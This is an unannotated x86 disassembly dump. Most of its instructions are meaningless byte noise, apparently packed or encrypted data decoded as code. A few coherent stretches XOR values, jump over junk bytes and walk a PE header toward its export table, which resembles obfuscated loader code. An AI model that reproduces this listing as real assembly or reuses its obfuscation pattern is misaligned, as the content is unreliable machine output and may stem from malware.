  408ce1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ce2:	je     0x408cd7
  408ce4:	mov    ebx,0x91591fdc
  408ce9:	pop    edi
  408cea:	pop    edx
  408ceb:	sub    al,0x24
  408ced:	adc    DWORD PTR [edi-0x5efda2ce],eax
  408cf3:	inc    ebp
  408cf4:	xor    al,0xb
  408cf6:	test   esp,edx
  408cf8:	call   0x421bf269
  408cfd:	or     eax,edx
  408cff:	pop    ebx
  408d00:	enter  0xa580,0x45
  408d04:	dec    ebp
  408d05:	out    dx,eax
  408d06:	mov    eax,0xaca8464b
  408d0b:	and    DWORD PTR [eax],esi
  408d0d:	jne    0x408d34
  408d0f:	repz neg bl
  408d12:	iret   
  408d13:	sbb    bh,0x65
  408d16:	fwait
  408d17:	mov    ?,WORD PTR [ebx+edx*8-0x3b58c943]
  408d1e:	xchg   edx,eax
  408d1f:	int3   
  408d20:	(bad)  
  408d21:	and    edi,DWORD PTR [ebp+0x135d5289]
  408d27:	and    al,0xf4
  408d29:	ss stc 
  408d2b:	ins    DWORD PTR es:[edi],dx
  408d2c:	icebp  
  408d2d:	jl     0x408ce0
  408d2f:	ja     0x408d81
  408d31:	mov    bh,0xab
  408d33:	dec    esp
  408d34:	inc    eax
  408d35:	call   0xa5d7a475
  408d3a:	(bad)  
  408d3b:	js     0x408cbe
  408d3d:	mov    dl,0x74
  408d3f:	mov    cl,0xa9
  408d41:	aaa    
  408d42:	aas    
  408d43:	pop    ds
  408d44:	cmp    ecx,DWORD PTR [edi]
  408d46:	jbe    0x408db3
  408d48:	out    dx,eax
  408d49:	clc    
  408d4a:	jp     0x408d55
  408d4c:	xlat   BYTE PTR ds:[ebx]
  408d4d:	icebp  
  408d4e:	jmp    0x4aa5:0xbec4dbdd
  408d55:	xchg   dh,al
  408d57:	and    eax,0x49141c6d
  408d5c:	jg     0x408dbc
  408d5e:	enter  0x4bb9,0xa9
  408d62:	icebp  
  408d63:	pop    ds
  408d64:	dec    edx
  408d65:	mov    dh,0x23
  408d67:	in     al,0xae
  408d69:	sahf   
  408d6a:	leave  
  408d6b:	cmp    eax,0x29e71d3e
  408d70:	push   ebp
  408d71:	inc    eax
  408d72:	loope  0x408d66
  408d74:	test   al,0xac
  408d76:	dec    esi
  408d77:	out    dx,al
  408d78:	xchg   esi,eax
  408d79:	fisttp QWORD PTR [eax]
  408d7b:	dec    esp
  408d7c:	repz test eax,0xf21bf441
  408d82:	mov    eax,0x23929180
  408d87:	mov    esi,0x91fc40a8
  408d8c:	aam    0x4f
  408d8e:	data16 fbstp TBYTE PTR [ebx+0x3c]
  408d92:	fst    DWORD PTR [ebp+0x5110bbd0]
  408d98:	jg     0x408e17
  408d9a:	cdq    
  408d9b:	sbb    esi,DWORD PTR [edi]
  408d9d:	das    
  408d9e:	popf   
  408d9f:	scas   eax,DWORD PTR es:[edi]
  408da0:	mov    dh,0xf6
  408da2:	cmp    eax,0x9dab5aad
  408da7:	pop    edx
  408da8:	test   BYTE PTR [ebx+0x3b],bl
  408dab:	cmc    
  408dac:	push   edx
  408dad:	mov    al,0x6
  408daf:	outs   dx,BYTE PTR ds:[esi]
  408db0:	pop    ds
  408db1:	pop    edx
  408db2:	popf   
  408db3:	and    al,0x1
  408db5:	outs   dx,DWORD PTR ds:[esi]
  408db6:	mov    ecx,0x24e471b8
  408dbb:	jmp    0x3e9203b1
  408dc0:	rdseed edx
  408dc3:	xor    dl,dl
  408dc5:	pop    esp
  408dc6:	div    ch
  408dc8:	inc    ebx
  408dc9:	sti    
  408dca:	mov    DWORD PTR [esi-0xe],ebp
  408dcd:	lock aaa 
  408dcf:	ja     0x408df0
  408dd1:	sbb    DWORD PTR [esi+0x563d849a],ebx
  408dd7:	sbb    eax,0x4120e37c
  408ddc:	xchg   ebp,eax
  408ddd:	enter  0x4f1b,0xd
  408de1:	or     DWORD PTR [esi],0x26
  408de4:	jmp    0x5cbf:0x17763662
  408deb:	stos   DWORD PTR es:[edi],eax
  408dec:	jne    0x408e3a
  408dee:	inc    edi
  408def:	arpl   WORD PTR [ebx+0x4a],cx
  408df2:	mov    edi,0x4ff5de80
  408df7:	pop    es
  408df8:	or     dl,dl
  408dfa:	js     0x408e3b
  408dfc:	out    dx,al
  408dfd:	or     DWORD PTR [edi+ebp*2+0x71a09b71],edx
  408e04:	sub    bl,dl
  408e06:	push   esi
  408e07:	mov    esp,ebx
  408e09:	aam    0x8e
  408e0b:	inc    edi
  408e0c:	and    eax,0x13899039
  408e11:	jae    0x408dba
  408e13:	mov    al,0x4b
  408e15:	jmp    0xab20:0xd34c077f
  408e1c:	loope  0x408e8a
  408e1e:	rcr    DWORD PTR [eax+ecx*2],0xea
  408e22:	int    0xba
  408e24:	lods   eax,DWORD PTR ds:[esi]
  408e25:	hlt    
  408e26:	mov    ax,WORD PTR [ebp-0x4]
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0xb8ab90bd
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	add    al,0x8
  408ec6:	mov    BYTE PTR [esi],0xbd
  408ec9:	xchg   ebx,ecx
  408ecb:	or     bl,0x95
  408ece:	cmp    DWORD PTR [ecx+0x5],esp
  408ed1:	inc    eax
  408ed2:	ficom  WORD PTR cs:[ebp+0x6f72953b]
  408ed9:	push   0xffffffe4
  408edb:	pop    esi
  408edc:	out    dx,eax
  408edd:	and    eax,0xd758e531
  408ee2:	(bad)  [esi]
  408ee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ee5:	pop    eax
  408ee6:	push   ebp
  408ee7:	sub    DWORD PTR [ecx+eiz*2-0x3ee28f45],0x6dc4e0ec
  408ef2:	in     eax,dx
  408ef3:	adc    DWORD PTR [esi-0xdd2a5c3],eax
  408ef9:	idiv   DWORD PTR [edi]
  408efb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408efc:	mov    bh,bh
  408efe:	adc    DWORD PTR [edx-0x20b7ca60],ebp
  408f04:	push   ebp
  408f05:	mov    ecx,0xa2d6d150
  408f0a:	out    dx,al
  408f0b:	sub    ch,BYTE PTR [edx-0x1e]
  408f0e:	pusha  
  408f0f:	push   0xffffffc7
  408f11:	in     al,dx
  408f12:	ror    BYTE PTR [eax],1
  408f14:	add    DWORD PTR [edx],ebp
  408f16:	aam    0x79
  408f18:	mov    ecx,0x68b716fb
  408f1d:	pop    ebp
  408f1e:	test   BYTE PTR [edx],cl
  408f20:	push   cs
  408f21:	jecxz  0x408ed5
  408f23:	dec    eax
  408f24:	pop    ebx
  408f25:	pop    ecx
  408f26:	and    BYTE PTR [eax-0x2debbcf3],dl
  408f2c:	push   esi
  408f2d:	jae    0x408eb8
  408f2f:	jnp    0x408f23
  408f31:	mov    cl,0x33
  408f33:	pop    es
  408f34:	repnz mov eax,ds:0x927cbc32
  408f3a:	jae    0x408f10
  408f3c:	hlt    
  408f3d:	jbe    0x408ecc
  408f3f:	out    dx,al
  408f40:	mov    sp,0x4d5
  408f44:	xor    ax,0xb94c
  408f48:	ja     0x408f4b
  408f4a:	ins    BYTE PTR es:[edi],dx
  408f4b:	xchg   bl,ch
  408f4d:	sbb    dl,BYTE PTR [ecx-0x55]
  408f50:	aas    
  408f51:	push   eax
  408f52:	sub    al,BYTE PTR es:[edx-0x35]
  408f56:	retf   
  408f57:	adc    al,0x3f
  408f59:	fisttp WORD PTR fs:[edx-0x42]
  408f5d:	in     eax,dx
  408f5e:	or     esp,ebx
  408f60:	je     0x408f7b
  408f62:	data16 mov dh,0xa7
  408f65:	nop
  408f66:	loopne 0x408f88
  408f68:	int3   
  408f69:	adc    BYTE PTR [ecx+0x4acc3cd7],ah
  408f6f:	mov    DWORD PTR [esi+0x2948c3ef],esp
  408f75:	mov    ebx,0x423e2d6
  408f7a:	or     dl,ch
  408f7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f7d:	call   0xbf8c:0x498bbb4
  408f84:	out    0xe9,al
  408f86:	sbb    esi,DWORD PTR [ecx]
  408f88:	jb     0x408f87
  408f8a:	push   ecx
  408f8b:	in     eax,dx
  408f8c:	(bad)  
  408f8d:	jmp    0x408f2a
  408f8f:	hlt    
  408f90:	push   esi
  408f91:	dec    esp
  408f92:	sub    ebp,ecx
  408f94:	int3   
  408f95:	push   esp
  408f96:	mov    eax,0x9b956744
  408f9b:	dec    esp
  408f9c:	sti    
  408f9d:	inc    eax
  408f9e:	or     BYTE PTR [eax+0x2c],ah
  408fa1:	xor    al,ch
  408fa3:	pop    ecx
  408fa4:	std    
  408fa5:	xchg   ebx,eax
  408fa6:	arpl   di,bp
  408fa8:	push   ecx
  408fa9:	push   eax
  408faa:	and    esi,DWORD PTR [ebx-0x3d]
  408fad:	ds mov ah,0x53
  408fb0:	fcomp  QWORD PTR [esp+ecx*2]
  408fb3:	xor    esi,esp
  408fb5:	sub    esp,DWORD PTR [edi-0x32]
  408fb8:	mov    BYTE PTR [ebp+0x603f5f55],ah
  408fbe:	test   al,0x91
  408fc0:	inc    esi
  408fc1:	pop    es
  408fc2:	ret    0x30b8
  408fc5:	es stos BYTE PTR es:[edi],al
  408fc7:	xor    dh,ah
  408fc9:	fmul   DWORD PTR [ebp+0x6255da5e]
  408fcf:	cs jge 0x408f9f
  408fd2:	xor    dl,BYTE PTR [eax+0x3041505f]
  408fd8:	adc    ch,ch
  408fda:	(bad)  
  408fdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fdd:	mov    al,0x12
  408fdf:	push   ss
  408fe0:	fwait
  408fe1:	mov    ds:0x2a86acd0,eax
  408fe6:	mov    ah,0xb3
  408fe8:	ret    
  408fe9:	fwait
  408fea:	dec    esp
  408feb:	adc    eax,0xf2b30453
  408ff0:	adc    eax,DWORD PTR [esi]
  408ff2:	pop    ds
  408ff3:	pop    edi
  408ff4:	jmp    0xbf49:0x97ed1d63
  408ffb:	dec    ebp
  408ffc:	add    edi,ebp
  408ffe:	push   0x5e
  409000:	jecxz  0x409052
  409002:	inc    edx
  409003:	sub    eax,0x8ce17f4f
  409008:	imul   eax,DWORD PTR [esi],0x70
  40900b:	or     eax,0x50a98224
  409010:	cs cmp ebx,edi
  409013:	cmp    BYTE PTR [ebp-0x20],ch
  409016:	(bad)  
  409018:	in     eax,dx
  409019:	pop    esp
  40901a:	fadd   DWORD PTR [eax+eiz*8-0x578036b0]
  409021:	loope  0x408fce
  409023:	dec    DWORD PTR [ebp+0x4f049ba8]
  409029:	inc    eax
  40902a:	loope  0x408fc0
  40902c:	mov    bl,0x20
  40902e:	lahf   
  40902f:	enter  0x75a1,0xa
  409033:	cmc    
  409034:	xchg   ecx,eax
  409035:	jmp    0x409050
  409037:	int    0xa7
  409039:	js     0x409078
  40903b:	cmp    ah,BYTE PTR [ecx+ebp*2-0xf]
  40903f:	ins    DWORD PTR es:[edi],dx
  409040:	xlat   BYTE PTR ds:[ebx]
  409041:	xchg   edx,eax
  409042:	dec    ecx
  409043:	mov    esi,0x813e8fa
  409048:	adc    dl,bl
  40904a:	ja     0x40901d
  40904c:	xor    ah,BYTE PTR [eax-0x57]
  40904f:	out    dx,al
  409050:	add    eax,0x9209ceab
  409055:	dec    esi
  409056:	shld   DWORD PTR [esi-0x32],eax,cl
  40905a:	adc    eax,0x8683a571
  40905f:	cmp    al,0x91
  409061:	and    BYTE PTR [edi+0x78],ah
  409064:	mov    edx,fs
  409066:	fnsave [ecx+0x61147791]
  40906c:	mov    al,ds:0x2c20d07a
  409071:	es (bad) 
  409074:	dec    esp
  409075:	ins    BYTE PTR es:[edi],dx
  409076:	repnz pop edi
  409078:	sbb    eax,0x517f4422
  40907d:	test   cl,dh
  40907f:	sahf   
  409080:	and    BYTE PTR [ebx],bl
  409082:	adc    eax,0x967364b9
  409087:	mov    BYTE PTR [ebp+0x395f2623],ah
  40908d:	mov    ebp,0x3811c615
  409092:	dec    ecx
  409093:	jmp    0x2f48b470
  409098:	hlt    
  409099:	(bad)  
  40909a:	xchg   edi,eax
  40909b:	cmp    edi,DWORD PTR [ebx-0x77d6de3]
  4090a1:	jo     0x4090a2
  4090a3:	add    DWORD PTR [ebp+0x5c8756af],0xa3ac3658
  4090ad:	mov    BYTE PTR [ebx],ah
  4090af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090b0:	mov    edx,DWORD PTR [esi]
  4090b2:	add    ebx,eax
  4090b4:	jmp    0x6612:0xebba1e9d
  4090bb:	(bad)  
  4090bc:	ficom  WORD PTR [eax]
  4090be:	xchg   DWORD PTR [edx],esp
  4090c0:	sub    dh,BYTE PTR [ebx+0x4c]
  4090c3:	xor    al,0xb0
  4090c5:	shl    DWORD PTR [esi+0x50],0xd9
  4090c9:	jp     0x40908d
  4090cb:	jno    0x409101
  4090cd:	mov    WORD PTR [esi+0x2b],cs
  4090d0:	pop    eax
  4090d1:	push   ss
  4090d2:	(bad)
  4090d5:	add    al,0x83
  4090d7:	add    eax,0x31be06fc
  4090dc:	inc    ecx
  4090dd:	xor    BYTE PTR [esi],0x79
  4090e0:	cli    
  4090e1:	into   
  4090e2:	dec    esp
  4090e3:	fsave  [esi+ebp*8]
  4090e7:	pop    ebx
  4090e8:	jno    0x4090e1
  4090ea:	in     eax,dx
  4090eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090ec:	pop    eax
  4090ed:	shl    BYTE PTR [ebx],1
  4090ef:	mov    BYTE PTR [ebx],0xc7
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0xc9
  409163:	adc    al,0xda
  409165:	jmp    0x409199
  409167:	fistp  QWORD PTR [esi+0x7e]
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	cmc    
  40916f:	ret    0x2e62
  409172:	push   edx
  409173:	mov    bl,0x45
  409175:	ds jno 0x409109
  409178:	sbb    ecx,DWORD PTR [ebx+0x7f]
  40917b:	ins    DWORD PTR es:[edi],dx
  40917c:	jb     0x4091b3
  40917e:	hlt    
  40917f:	dec    ebx
  409180:	lods   eax,DWORD PTR ds:[esi]
  409181:	sbb    esp,DWORD PTR [edx+0x6]
  409184:	jg     0x409198
  409186:	ret    
  409187:	out    dx,eax
  409188:	hlt    
  409189:	pop    esp
  40918a:	dec    ebx
  40918b:	xchg   esi,eax
  40918c:	sbb    al,0x50
  40918e:	pop    ecx
  40918f:	cmp    DWORD PTR [ebp-0xf],0x54b008e3
  409196:	xchg   edi,eax
  409197:	xor    ah,BYTE PTR [ebx+0x2457997c]
  40919d:	das    
  40919e:	push   ds
  40919f:	xchg   BYTE PTR [ecx],ah
  4091a1:	jo     0x409142
  4091a3:	js     0x4091a4
  4091a5:	push   0xffffffd0
  4091a7:	xchg   ecx,eax
  4091a8:	push   0xffffffb2
  4091aa:	test   BYTE PTR [edi+0x3e],dl
  4091ad:	fst    DWORD PTR [ebx]
  4091af:	adc    eax,esi
  4091b1:	fabs   
  4091b3:	leave  
  4091b4:	push   0x31
  4091b6:	dec    eax
  4091b7:	prefetch BYTE PTR [ebx-0x6cdee5b8]
  4091be:	packsswb mm6,QWORD PTR [ecx+0x65c41d6c]
  4091c5:	ret    
  4091c6:	leave  
  4091c7:	fcmovnu st,st(2)
  4091c9:	pop    esp
  4091ca:	cmc    
  4091cb:	popf   
  4091cc:	arpl   WORD PTR ds:0xbda76633,ax
  4091d2:	add    DWORD PTR [ebx+0x1c976986],0x2fe8467c
  4091dc:	hlt    
  4091dd:	(bad)  
  4091de:	into   
  4091df:	sub    BYTE PTR [ebp+0x3705e46a],ch
  4091e5:	sbb    cl,BYTE PTR [eax+0x28]
  4091e8:	lahf   
  4091e9:	xchg   ebx,eax
  4091ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091eb:	test   al,0x25
  4091ed:	adc    esp,DWORD PTR [edi]
  4091ef:	mov    al,ds:0x15577ed4
  4091f4:	fcom   DWORD PTR [esi-0x74caef01]
  4091fa:	cmp    ah,BYTE PTR [edx+0xb71eec]
  409200:	addr16 je 0x40919b
  409203:	mov    edi,0x77ae6166
  409208:	cmc    
  409209:	jno    0x409217
  40920b:	sub    bh,BYTE PTR [ebp+ebx*8-0x603a64e]
  409212:	gs add ch,cl
  409215:	cmp    bl,BYTE PTR [ecx]
  409217:	mov    al,0x48
  409219:	adc    al,0x28
  40921b:	dec    ebx
  40921c:	icebp  
  40921d:	mov    eax,ds:0x144dbd79
  409222:	(bad)  
  409223:	mov    ds:0xfbefa201,eax
  409228:	or     DWORD PTR [ecx+0x3e],0xffffffc2
  40922c:	jge    0x4091e6
  40922e:	jg     0x409273
  409230:	in     eax,dx
  409231:	(bad)  
  409232:	pop    ebp
  409233:	adc    BYTE PTR [ecx],bl
  409235:	retf   0xe2d5
  409238:	jns    0x4091db
  40923a:	adc    DWORD PTR [edx+0x3431266c],ebp
  409240:	mov    eax,ds:0xc9bc67e4
  409245:	outs   dx,BYTE PTR ds:[esi]
  409246:	cmp    BYTE PTR [edx+0x74],0x3b
  40924a:	aad    0xf4
  40924c:	pop    es
  40924d:	lods   eax,DWORD PTR ds:[esi]
  40924e:	xchg   BYTE PTR [ebx+0x14],al
  409251:	push   ss
  409252:	mov    edi,0x24399e3f
  409257:	push   edi
  409258:	shl    BYTE PTR [esi+0x1f],cl
  40925b:	xchg   ebx,eax
  40925c:	xchg   ebx,eax
  40925d:	punpckhbw mm5,QWORD PTR [esi-0x5046576f]
  409264:	sub    BYTE PTR [ebx-0x2e],cl
  409267:	mov    al,0xed
  409269:	ja     0x40922d
  40926b:	pop    ebp
  40926c:	xchg   esi,eax
  40926d:	add    BYTE PTR [ebp-0x40],0x37
  409271:	sbb    eax,0xd8fd4d8a
  409276:	imul   eax,DWORD PTR [edx+0x7355c8a5],0x2014dae8
  409280:	mov    ebp,0x8b42247a
  409285:	mov    bh,0x8
  409287:	sub    al,0xd
  409289:	test   al,0x2f
  40928b:	lods   eax,DWORD PTR ds:[esi]
  40928c:	(bad)  
  40928d:	loopne 0x409294
  40928f:	mov    bh,0x4f
  409291:	or     al,BYTE PTR [eax-0x74685bec]
  409297:	dec    eax
  409298:	cmp    al,0x7e
  40929a:	mov    al,BYTE PTR [edi+0x6e7095d7]
  4092a0:	ins    DWORD PTR es:[edi],dx
  4092a1:	mov    ds:0x4d05b3d0,eax
  4092a6:	ja     0x40930d
  4092a8:	sub    esi,DWORD PTR [ecx+ebx*4+0x749c85ed]
  4092af:	jmp    0xad6a8df1
  4092b4:	mov    ah,BYTE PTR [edi-0x3f]
  4092b7:	and    DWORD PTR [edx],ecx
  4092b9:	mov    al,0x28
  4092bb:	inc    esp
  4092bc:	adc    al,0xd1
  4092be:	repnz or esp,edx
  4092c1:	push   cs
  4092c2:	mov    ds:0xc1fd83a4,eax
  4092c7:	cmc    
  4092c8:	xchg   esi,eax
  4092c9:	rcr    DWORD PTR [eax+ebp*4-0x578a043c],1
  4092d0:	(bad)  
  4092d1:	xor    al,0x78
  4092d3:	jle    0x4092ae
  4092d5:	pop    ds
  4092d6:	nop
  4092d7:	push   ebp
  4092d8:	in     al,dx
  4092d9:	lods   eax,DWORD PTR ds:[esi]
  4092da:	(bad)  
  4092db:	nop
  4092dc:	shl    BYTE PTR [edx+0x32],1
  4092df:	mov    ecx,0x8618e0fd
  4092e4:	mov    eax,0x214deb2b
  4092e9:	xor    al,0xb2
  4092eb:	sub    eax,0xb426ab66
  4092f0:	rcr    DWORD PTR [ecx+0x75],cl
  4092f3:	stos   DWORD PTR es:[edi],eax
  4092f4:	xchg   BYTE PTR [esi],al
  4092f6:	pop    eax
  4092f7:	stc    
  4092f8:	mov    ah,ch
  4092fa:	add    BYTE PTR [eax-0x66108923],0x6b
  409301:	mov    eax,0x4179a1e0
  409306:	inc    eax
  409307:	pop    ebp
  409308:	lods   al,BYTE PTR ds:[esi]
  409309:	adc    BYTE PTR [ebx],dh
  40930b:	push   edx
  40930c:	and    bh,bh
  40930e:	inc    ebp
  40930f:	cmp    BYTE PTR [edi],bl
  409311:	std    
  409312:	fs aam 0x17
  409315:	into   
  409316:	mov    DWORD PTR [ebx],0xd66b040e
  40931c:	dec    ecx
  40931d:	sub    DWORD PTR [ebp+0x7c],ecx
  409320:	daa    
  409321:	sub    eax,0x6753640e
  409326:	repz cmp DWORD PTR [esi],eax
  409329:	rcr    BYTE PTR [ebp+0x2df7c4fa],cl
  40932f:	or     ah,BYTE PTR [esp+eiz*8+0x1288cb4]
  409336:	mov    ds:0x39d9bdda,al
  40933b:	cmp    al,BYTE PTR [ebx+0x50]
  40933e:	and    ebx,DWORD PTR [edx]
  409340:	inc    eax
  409341:	mov    edi,DWORD PTR [ebx-0x20f66db]
  409347:	hlt    
  409348:	mov    ah,0xdb
  40934a:	ja     0x4092e6
  40934c:	add    BYTE PTR [ebp-0x72],dl
  40934f:	(bad)  
  409351:	mov    ds:0xcae07f9a,eax
  409356:	jmp    0xe20e26e6
  40935b:	jno    0x4093b7
  40935d:	sub    DWORD PTR [edx-0x256cfee8],edi
  409363:	gs xchg ebp,eax
  409365:	pop    esp
  409366:	adc    BYTE PTR ds:0xb9c46a0,al
  40936c:	push   ebx
  40936d:	push   edi
  40936e:	jo     0x40930e
  409370:	test   BYTE PTR [ebp-0x58],0x48
  409374:	ret    
  409375:	popf   
  409376:	or     DWORD PTR [ebx+0x2425eb35],0xffffffa8
  40937d:	outs   dx,BYTE PTR ds:[esi]
  40937e:	pop    edi
  40937f:	aam    0x6a
  409381:	addr16 sub al,0xd8
  409384:	cs mov ah,0x3b
  409387:	mov    ebp,0x4d6c3fee
  40938c:	repnz aas 
  40938e:	imul   edx,DWORD PTR [edi+edx*8+0x6a],0x3cd29696
  409396:	adc    BYTE PTR [esi-0x77],dl
  409399:	or     BYTE PTR [ebx+0x458b0c45],cl
  40939f:	or     bh,bh
  4093a1:	jne    0x40939b
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	mov    ah,0xdf
  4093b6:	gs rcr eax,cl
  4093b9:	fnstsw WORD PTR [esi+0x7e]
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	mov    dl,0xc6
  4093c2:	loopne 0x40934f
  4093c4:	mov    gs,WORD PTR [ebx+edi*8-0x4ca516e9]
  4093cb:	sbb    DWORD PTR [ebp+0xc],eax
  4093ce:	fiadd  WORD PTR [esi+eiz*2]
  4093d1:	popa   
  4093d2:	std    
  4093d3:	jp     0x409414
  4093d5:	or     BYTE PTR [ecx-0x19],0x5c
  4093d9:	push   ebp
  4093da:	pop    ebp
  4093db:	popf   
  4093dc:	mov    es,WORD PTR [ebp+0x10]
  4093df:	add    cl,BYTE PTR [eax]
  4093e1:	jg     0x409407
  4093e3:	mov    ebx,0xbd2b0df8
  4093e8:	inc    ebx
  4093e9:	inc    esi
  4093ea:	xor    eax,0x223a77c6
  4093ef:	mov    ?,ebp
  4093f1:	std    
  4093f2:	bound  esi,QWORD PTR [esi]
  4093f4:	pop    ebp
  4093f5:	stc    
  4093f6:	(bad)  
  4093f7:	or     al,0x45
  4093f9:	mov    ss,WORD PTR [ecx]
  4093fb:	cmp    al,0x15
  4093fd:	pop    esp
  4093fe:	loopne 0x4093e1
  409400:	int3   
  409401:	sub    ebx,esp
  409403:	mov    eax,0xa0e2d8a1
  409408:	cwde   
  409409:	ror    BYTE PTR [ebx-0x51],1
  40940c:	lods   eax,DWORD PTR ds:[esi]
  40940d:	mov    DWORD PTR gs:[esi],edx
  409410:	xchg   DWORD PTR [edx-0x4a115db2],esi
  409416:	sub    esi,edi
  409418:	mov    dh,BYTE PTR [eax-0x3c8093fa]
  40941e:	jb     0x409442
  409420:	cmp    edi,edx
  409422:	and    al,0xf4
  409424:	ret    
  409425:	ins    DWORD PTR es:[edi],dx
  409426:	dec    ebp
  409427:	dec    ebx
  409428:	dec    esp
  409429:	adc    BYTE PTR [eax+0x7cbfc28],dl
  40942f:	mov    esp,0x54f696e8
  409434:	push   ebx
  409435:	cmp    al,0x5a
  409437:	push   0xffffffae
  409439:	fsubr  DWORD PTR [esi-0x4ddfcc0]
  40943f:	ja     0x409460
  409441:	dec    ecx
  409442:	lea    esp,[eax]
  409444:	fadd   DWORD PTR [eax+eiz*4-0x6344edef]
  40944b:	dec    eax
  40944c:	dec    esp
  40944d:	outs   dx,BYTE PTR ds:[esi]
  40944e:	loopne 0x4093f0
  409450:	mov    ebp,0x77a8599f
  409455:	inc    esi
  409456:	retf   
  409457:	mov    ecx,0x101cb4c3
  40945c:	jnp    0x4094aa
  40945e:	in     al,0xec
  409460:	adc    BYTE PTR [edx+ebx*1],bh
  409463:	(bad)  
  409464:	rol    BYTE PTR [edi+0x7f868465],1
  40946a:	in     al,0x73
  40946c:	jno    0x40949a
  40946e:	push   ebx
  40946f:	cdq    
  409470:	popa   
  409471:	sahf   
  409472:	add    eax,0x5af57b0
  409477:	shl    BYTE PTR [eax],cl
  409479:	xor    al,0x5a
  40947b:	sbb    DWORD PTR [ebp+0x7b550c27],edi
  409481:	mov    ecx,0xba0a27c0
  409486:	aam    0x74
  409488:	inc    ebx
  409489:	ja     0x409429
  40948b:	enter  0xbd51,0xad
  40948f:	(bad)  
  409492:	add    eax,0x37027d5f
  409497:	je     0x409431
  409499:	call   0xc7cd:0x2710dcd4
  4094a0:	jb     0x4094d5
  4094a2:	add    dh,BYTE PTR [edx+0x8b8c9c8]
  4094a8:	fs xchg esi,eax
  4094aa:	shl    DWORD PTR [eax-0xf19ac60],cl
  4094b0:	imul   esp,DWORD PTR [edx+0x12],0xff27c33e
  4094b7:	rol    BYTE PTR [ecx-0x16],cl
  4094ba:	add    cl,BYTE PTR [esi]
  4094bc:	inc    eax
  4094bd:	jmp    0x6eb244a1
  4094c2:	in     eax,dx
  4094c3:	ret    
  4094c4:	mov    esp,0x63717bd5
  4094c9:	frstor [ecx+0x6]
  4094cc:	jbe    0x409534
  4094ce:	jne    0x409540
  4094d0:	jecxz  0x409504
  4094d2:	jne    0x4094c9
